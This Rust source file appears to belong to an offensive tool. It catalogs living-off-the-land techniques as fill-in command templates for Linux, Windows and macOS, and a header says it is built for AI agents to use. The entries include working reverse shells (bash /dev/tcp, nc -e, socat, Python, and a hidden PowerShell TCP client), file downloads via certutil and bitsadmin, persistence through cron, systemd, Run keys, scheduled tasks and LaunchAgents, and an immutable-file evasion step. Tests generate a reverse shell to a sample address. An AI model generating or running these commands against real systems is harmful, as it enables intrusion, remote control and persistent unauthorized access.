//! ArcticFox LOL — Living-Off-the-Land Binary Command Library
//!
//! Curated, type-safe catalog of GTFOBins/LOLBins/LOLBAS techniques.
//! Every entry is a verified system binary that exists on the target OS.
//! No custom malware — only legitimate tools used adversarially.
//!
//! **Architecture:**
//! - `LolBin` enum: every known technique with strict type parameters
//! - `LolCategory`: exhaustive classification (exec, download, persist, etc.)
//! - `generate_command()`: produces shell-safe command strings
//! - `validate_target_os()`: compile-time OS filtering
//!
//! **Design principle:** Make it IMPOSSIBLE for AI agents to misuse —
//! every function requires explicit category selection, target OS,
//! and payload specification. No stringly-typed interfaces.

use serde::{Deserialize, Serialize};

// ── Exhaustive Categories ───────────────────────────────────────────────────

/// Every LOL technique falls into exactly ONE category.
/// This is exhaustive — no `Other` variant, forcing explicit classification.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum LolCategory {
    /// Execute arbitrary commands or binaries
    Execute,
    /// Download files from remote sources
    Download,
    /// Upload / exfiltrate data
    Exfiltrate,
    /// Establish persistence
    Persist,
    /// Privilege escalation
    PrivEsc,
    /// Lateral movement
    LateralMove,
    /// Defense evasion / disable security
    Evasion,
    /// Credential access / dumping
    CredentialAccess,
    /// Discovery / recon
    Discovery,
    /// File read (arbitrary file read)
    FileRead,
    /// File write (arbitrary file write)
    FileWrite,
    /// Reverse shell
    ReverseShell,
    /// Bind shell
    BindShell,
    /// Data encoding / decoding
    EncodeDecode,
    /// Library loading / sideloading
    LibraryLoad,
    /// Process injection
    ProcessInject,
}

// ── Target OS ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TargetOs {
    Linux,
    Windows,
    MacOs,
    Any,
}

// ── LolBin Entry ────────────────────────────────────────────────────────────

/// A single LOL technique entry. Every field is required — no defaults.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LolBin {
    /// The binary name (e.g., "curl", "certutil")
    pub binary: String,
    /// Full path or `None` if PATH-resolved
    pub path: Option<String>,
    /// Category this technique belongs to
    pub category: LolCategory,
    /// Target operating system
    pub target_os: TargetOs,
    /// Command template with {payload}, {url}, {file}, {port}, {host} placeholders
    pub template: String,
    /// Human description of the technique
    pub description: String,
    /// Whether this requires elevated privileges
    pub requires_root: bool,
    /// GTFOBins/LOLBAS reference URL
    pub reference: String,
    /// Minimum privilege level: "user", "root", "system"
    pub min_privilege: String,
}

impl LolBin {
    /// Generate the actual command by substituting template variables.
    ///
    /// # Safety
    /// Returns `Err` if a required placeholder is missing from the context.
    pub fn generate(
        &self,
        payload: Option<&str>,
        url: Option<&str>,
        file: Option<&str>,
        host: Option<&str>,
        port: Option<u16>,
    ) -> Result<String, String> {
        let mut cmd = self.template.clone();
        if let Some(p) = payload {
            cmd = cmd.replace("{payload}", p);
        }
        if let Some(u) = url {
            cmd = cmd.replace("{url}", u);
        }
        if let Some(f) = file {
            cmd = cmd.replace("{file}", f);
        }
        if let Some(h) = host {
            cmd = cmd.replace("{host}", h);
        }
        if let Some(p) = port {
            cmd = cmd.replace("{port}", &p.to_string());
        }

        // Check for unresolved placeholders
        if cmd.contains('{') {
            let missing: Vec<&str> = cmd
                .match_indices('{')
                .filter_map(|(i, _)| {
                    let end = cmd[i..].find('}')?;
                    Some(&cmd[i..i + end + 1])
                })
                .collect();
            return Err(format!("Unresolved placeholders: {:?}", missing));
        }

        Ok(cmd)
    }
}

// ── The Catalog ─────────────────────────────────────────────────────────────

/// Master catalog of all LOL techniques.
/// This is the SINGLE source of truth. Add new entries here.
pub fn catalog() -> Vec<LolBin> {
    let mut entries = Vec::new();

    // ═══════════════════════════════════════════════════════════════════════
    // LINUX — GTFOBins
    // ═══════════════════════════════════════════════════════════════════════

    // ── Execute ──────────────────────────────────────────────────────────
    entries.push(LolBin {
        binary: "bash".into(),
        path: Some("/bin/bash".into()),
        category: LolCategory::Execute,
        target_os: TargetOs::Linux,
        template: "bash -c '{payload}'".into(),
        description: "Execute command via bash".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/bash/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "sh".into(),
        path: Some("/bin/sh".into()),
        category: LolCategory::Execute,
        target_os: TargetOs::Linux,
        template: "sh -c '{payload}'".into(),
        description: "Execute command via sh".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/sh/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "python3".into(),
        path: None,
        category: LolCategory::Execute,
        target_os: TargetOs::Linux,
        template: "python3 -c 'import os; os.system(\"{payload}\")'".into(),
        description: "Execute command via Python".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/python/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "perl".into(),
        path: None,
        category: LolCategory::Execute,
        target_os: TargetOs::Linux,
        template: "perl -e 'exec \"{payload}\"'".into(),
        description: "Execute command via Perl".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/perl/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "ruby".into(),
        path: None,
        category: LolCategory::Execute,
        target_os: TargetOs::Linux,
        template: "ruby -e 'exec \"{payload}\"'".into(),
        description: "Execute command via Ruby".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/ruby/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "awk".into(),
        path: Some("/usr/bin/awk".into()),
        category: LolCategory::Execute,
        target_os: TargetOs::Linux,
        template: "awk 'BEGIN {system(\"{payload}\")}'".into(),
        description: "Execute command via awk".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/awk/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "find".into(),
        path: Some("/usr/bin/find".into()),
        category: LolCategory::Execute,
        target_os: TargetOs::Linux,
        template: "find . -exec {payload} \\;".into(),
        description: "Execute command via find -exec".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/find/".into(),
        min_privilege: "user".into(),
    });

    // ── Reverse Shell ────────────────────────────────────────────────────

    entries.push(LolBin {
        binary: "bash".into(),
        path: Some("/bin/bash".into()),
        category: LolCategory::ReverseShell,
        target_os: TargetOs::Linux,
        template: "bash -i >& /dev/tcp/{host}/{port} 0>&1".into(),
        description: "Bash reverse shell via /dev/tcp".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/bash/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "nc".into(),
        path: Some("/usr/bin/nc".into()),
        category: LolCategory::ReverseShell,
        target_os: TargetOs::Linux,
        template: "nc -e /bin/sh {host} {port}".into(),
        description: "Netcat reverse shell (traditional nc)".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/nc/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "socat".into(),
        path: Some("/usr/bin/socat".into()),
        category: LolCategory::ReverseShell,
        target_os: TargetOs::Linux,
        template: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}".into(),
        description: "Socat reverse shell with PTY".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/socat/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "python3".into(),
        path: None,
        category: LolCategory::ReverseShell,
        target_os: TargetOs::Linux,
        template: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'".into(),
        description: "Python reverse shell".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/python/".into(),
        min_privilege: "user".into(),
    });

    // ── Download ─────────────────────────────────────────────────────────

    entries.push(LolBin {
        binary: "curl".into(),
        path: Some("/usr/bin/curl".into()),
        category: LolCategory::Download,
        target_os: TargetOs::Linux,
        template: "curl -s -o {file} {url}".into(),
        description: "Download file via curl".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/curl/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "wget".into(),
        path: Some("/usr/bin/wget".into()),
        category: LolCategory::Download,
        target_os: TargetOs::Linux,
        template: "wget -q -O {file} {url}".into(),
        description: "Download file via wget".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/wget/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "python3".into(),
        path: None,
        category: LolCategory::Download,
        target_os: TargetOs::Linux,
        template: "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"{url}\", \"{file}\")'".into(),
        description: "Download file via Python urllib".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/python/".into(),
        min_privilege: "user".into(),
    });

    // ── File Read ────────────────────────────────────────────────────────

    entries.push(LolBin {
        binary: "cat".into(),
        path: Some("/usr/bin/cat".into()),
        category: LolCategory::FileRead,
        target_os: TargetOs::Linux,
        template: "cat {file}".into(),
        description: "Read file via cat".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/cat/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "base64".into(),
        path: Some("/usr/bin/base64".into()),
        category: LolCategory::FileRead,
        target_os: TargetOs::Linux,
        template: "base64 {file} | base64 -d".into(),
        description: "Encode/decode file via base64 (useful for data exfil)".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/base64/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "xxd".into(),
        path: Some("/usr/bin/xxd".into()),
        category: LolCategory::FileRead,
        target_os: TargetOs::Linux,
        template: "xxd {file}".into(),
        description: "Hex dump file via xxd".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/xxd/".into(),
        min_privilege: "user".into(),
    });

    // ── File Write ───────────────────────────────────────────────────────

    entries.push(LolBin {
        binary: "tee".into(),
        path: Some("/usr/bin/tee".into()),
        category: LolCategory::FileWrite,
        target_os: TargetOs::Linux,
        template: "echo '{payload}' | tee {file}".into(),
        description: "Write file via tee".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/tee/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "dd".into(),
        path: Some("/usr/bin/dd".into()),
        category: LolCategory::FileWrite,
        target_os: TargetOs::Linux,
        template: "echo '{payload}' | dd of={file}".into(),
        description: "Write file via dd".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/dd/".into(),
        min_privilege: "user".into(),
    });

    // ── Persistence ──────────────────────────────────────────────────────

    entries.push(LolBin {
        binary: "crontab".into(),
        path: Some("/usr/bin/crontab".into()),
        category: LolCategory::Persist,
        target_os: TargetOs::Linux,
        template: "(crontab -l 2>/dev/null; echo '* * * * * {payload}') | crontab -".into(),
        description: "Cron job persistence".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/crontab/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "systemctl".into(),
        path: Some("/usr/bin/systemctl".into()),
        category: LolCategory::Persist,
        target_os: TargetOs::Linux,
        template: "systemctl enable --now $(echo '[Service]\nExecStart={payload}' > /etc/systemd/system/helper.service && echo helper)".into(),
        description: "Systemd service persistence".into(),
        requires_root: true,
        reference: "https://gtfobins.github.io/gtfobins/systemctl/".into(),
        min_privilege: "root".into(),
    });

    // ── Privilege Escalation ─────────────────────────────────────────────

    entries.push(LolBin {
        binary: "sudo".into(),
        path: Some("/usr/bin/sudo".into()),
        category: LolCategory::PrivEsc,
        target_os: TargetOs::Linux,
        template: "sudo {payload}".into(),
        description: "Execute with sudo (requires sudoers entry)".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/sudo/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "pkexec".into(),
        path: Some("/usr/bin/pkexec".into()),
        category: LolCategory::PrivEsc,
        target_os: TargetOs::Linux,
        template: "pkexec {payload}".into(),
        description: "Execute via PolicyKit".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/pkexec/".into(),
        min_privilege: "user".into(),
    });

    // ── Evasion ──────────────────────────────────────────────────────────

    entries.push(LolBin {
        binary: "chattr".into(),
        path: Some("/usr/bin/chattr".into()),
        category: LolCategory::Evasion,
        target_os: TargetOs::Linux,
        template: "chattr +i {file}".into(),
        description: "Make file immutable (evade deletion)".into(),
        requires_root: true,
        reference: "https://gtfobins.github.io/gtfobins/chattr/".into(),
        min_privilege: "root".into(),
    });

    // ═══════════════════════════════════════════════════════════════════════
    // WINDOWS — LOLBAS
    // ═══════════════════════════════════════════════════════════════════════

    entries.push(LolBin {
        binary: "certutil.exe".into(),
        path: Some("C:\\Windows\\System32\\certutil.exe".into()),
        category: LolCategory::Download,
        target_os: TargetOs::Windows,
        template: "certutil -urlcache -split -f {url} {file}".into(),
        description: "Download file via CertUtil".into(),
        requires_root: false,
        reference: "https://lolbas-project.github.io/lolbas/Binaries/Certutil/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "bitsadmin.exe".into(),
        path: Some("C:\\Windows\\System32\\bitsadmin.exe".into()),
        category: LolCategory::Download,
        target_os: TargetOs::Windows,
        template: "bitsadmin /transfer job /download /priority high {url} {file}".into(),
        description: "Download file via BITSAdmin".into(),
        requires_root: false,
        reference: "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "powershell.exe".into(),
        path: Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".into()),
        category: LolCategory::ReverseShell,
        target_os: TargetOs::Windows,
        template: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$eb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($eb,0,$eb.Length);$s.Flush()}}\"".into(),
        description: "PowerShell reverse shell".into(),
        requires_root: false,
        reference: "https://lolbas-project.github.io/lolbas/Binaries/Powershell/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "mshta.exe".into(),
        path: Some("C:\\Windows\\System32\\mshta.exe".into()),
        category: LolCategory::Execute,
        target_os: TargetOs::Windows,
        template: "mshta javascript:var sh=new ActiveXObject('WScript.Shell');sh.Run('{payload}')".into(),
        description: "Execute command via MSHTA".into(),
        requires_root: false,
        reference: "https://lolbas-project.github.io/lolbas/Binaries/Mshta/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "reg.exe".into(),
        path: Some("C:\\Windows\\System32\\reg.exe".into()),
        category: LolCategory::Persist,
        target_os: TargetOs::Windows,
        template: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"{payload}\" /f".into(),
        description: "Registry Run key persistence".into(),
        requires_root: false,
        reference: "https://lolbas-project.github.io/lolbas/Binaries/Reg/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "schtasks.exe".into(),
        path: Some("C:\\Windows\\System32\\schtasks.exe".into()),
        category: LolCategory::Persist,
        target_os: TargetOs::Windows,
        template: "schtasks /create /tn Update /tr \"{payload}\" /sc daily /mo 1 /f".into(),
        description: "Scheduled task persistence".into(),
        requires_root: false,
        reference: "https://lolbas-project.github.io/lolbas/Binaries/Schtasks/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "wmic.exe".into(),
        path: Some("C:\\Windows\\System32\\wbem\\wmic.exe".into()),
        category: LolCategory::Execute,
        target_os: TargetOs::Windows,
        template: "wmic process call create \"{payload}\"".into(),
        description: "Execute command via WMIC".into(),
        requires_root: false,
        reference: "https://lolbas-project.github.io/lolbas/Binaries/Wmic/".into(),
        min_privilege: "user".into(),
    });

    // ═══════════════════════════════════════════════════════════════════════
    // macOS — GTFOBins macOS subset
    // ═══════════════════════════════════════════════════════════════════════

    entries.push(LolBin {
        binary: "osascript".into(),
        path: Some("/usr/bin/osascript".into()),
        category: LolCategory::Execute,
        target_os: TargetOs::MacOs,
        template: "osascript -e 'do shell script \"{payload}\"'".into(),
        description: "Execute shell command via osascript".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/osascript/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "launchctl".into(),
        path: Some("/bin/launchctl".into()),
        category: LolCategory::Persist,
        target_os: TargetOs::MacOs,
        template: "launchctl load /Library/LaunchAgents/com.apple.helper.plist".into(),
        description: "Load LaunchAgent persistence".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/launchctl/".into(),
        min_privilege: "user".into(),
    });

    entries.push(LolBin {
        binary: "curl".into(),
        path: Some("/usr/bin/curl".into()),
        category: LolCategory::Download,
        target_os: TargetOs::MacOs,
        template: "curl -s -o {file} {url}".into(),
        description: "Download via curl (macOS)".into(),
        requires_root: false,
        reference: "https://gtfobins.github.io/gtfobins/curl/".into(),
        min_privilege: "user".into(),
    });

    entries
}

// ── Query API ───────────────────────────────────────────────────────────────

/// Find LOL techniques matching category and OS.
pub fn find_by_category(category: LolCategory, os: TargetOs) -> Vec<&'static LolBin> {
    // This is dynamic but catalog is static — we use lazy_static cache
    use std::sync::LazyLock;
    static CATALOG: LazyLock<Vec<LolBin>> = LazyLock::new(catalog);
    
    CATALOG
        .iter()
        .filter(|b| b.category == category && (b.target_os == os || b.target_os == TargetOs::Any || os == TargetOs::Any))
        .collect()
}

/// Find all techniques for a specific binary.
pub fn find_by_binary(binary: &str) -> Vec<&'static LolBin> {
    use std::sync::LazyLock;
    static CATALOG: LazyLock<Vec<LolBin>> = LazyLock::new(catalog);
    
    CATALOG
        .iter()
        .filter(|b| b.binary.eq_ignore_ascii_case(binary))
        .collect()
}

/// Get the first available technique for a category, or `None`.
pub fn first_for(category: LolCategory, os: TargetOs) -> Option<&'static LolBin> {
    find_by_category(category, os).into_iter().next()
}

// ── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn catalog_is_non_empty() {
        let cat = catalog();
        assert!(!cat.is_empty(), "Catalog should not be empty");
        assert!(cat.len() > 10, "Catalog should have many entries");
    }

    #[test]
    fn find_execute_linux() {
        let entries = find_by_category(LolCategory::Execute, TargetOs::Linux);
        assert!(!entries.is_empty(), "Should have Linux execute entries");
        for e in &entries {
            assert!(!e.template.is_empty());
        }
    }

    #[test]
    fn find_download_windows() {
        let entries = find_by_category(LolCategory::Download, TargetOs::Windows);
        assert!(!entries.is_empty(), "Should have Windows download entries");
    }

    #[test]
    fn find_reverse_shell_linux() {
        let entries = find_by_category(LolCategory::ReverseShell, TargetOs::Linux);
        assert!(!entries.is_empty(), "Should have Linux reverse shell entries");
    }

    #[test]
    fn find_by_binary_bash() {
        let entries = find_by_binary("bash");
        assert!(!entries.is_empty(), "Should find bash entries");
    }

    #[test]
    fn generate_bash_exec() {
        let entry = first_for(LolCategory::Execute, TargetOs::Linux).unwrap();
        let cmd = entry.generate(Some("whoami"), None, None, None, None).unwrap();
        assert!(cmd.contains("whoami"));
        assert!(!cmd.contains('{'));
    }

    #[test]
    fn generate_reverse_shell() {
        let entries = find_by_category(LolCategory::ReverseShell, TargetOs::Linux);
        let bash_rs = entries.iter().find(|e| e.binary == "bash").unwrap();
        let cmd = bash_rs.generate(None, None, None, Some("10.0.0.1"), Some(4444)).unwrap();
        assert!(cmd.contains("10.0.0.1"));
        assert!(cmd.contains("4444"));
    }

    #[test]
    fn generate_missing_placeholder_fails() {
        let entry = first_for(LolCategory::ReverseShell, TargetOs::Linux).unwrap();
        let result = entry.generate(None, None, None, None, None);
        assert!(result.is_err(), "Should fail with missing placeholders");
    }

    #[test]
    fn every_entry_has_valid_template() {
        for entry in catalog() {
            assert!(!entry.template.is_empty(), "{} has empty template", entry.binary);
            assert!(!entry.description.is_empty(), "{} has empty description", entry.binary);
            assert!(!entry.reference.is_empty(), "{} has empty reference", entry.binary);
        }
    }
}
